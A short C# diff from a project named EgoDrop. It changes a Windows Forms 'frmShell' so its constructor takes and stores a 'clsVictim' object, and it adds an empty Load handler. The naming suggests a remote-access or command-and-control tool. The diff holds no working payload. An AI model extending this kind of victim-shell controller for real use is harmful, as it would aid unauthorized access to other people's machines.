@@ -12,9 +12,18 @@ namespace EgoDrop
 {
     public partial class frmShell : Form
     {
-        public frmShell()
+        private clsVictim m_victim { get; set; }
+
+        public frmShell(clsVictim victim)
         {
             InitializeComponent();
+
+            m_victim = victim;
+        }
+
+        private void frmShell_Load(object sender, EventArgs e)
+        {
+            
         }
     }
 }
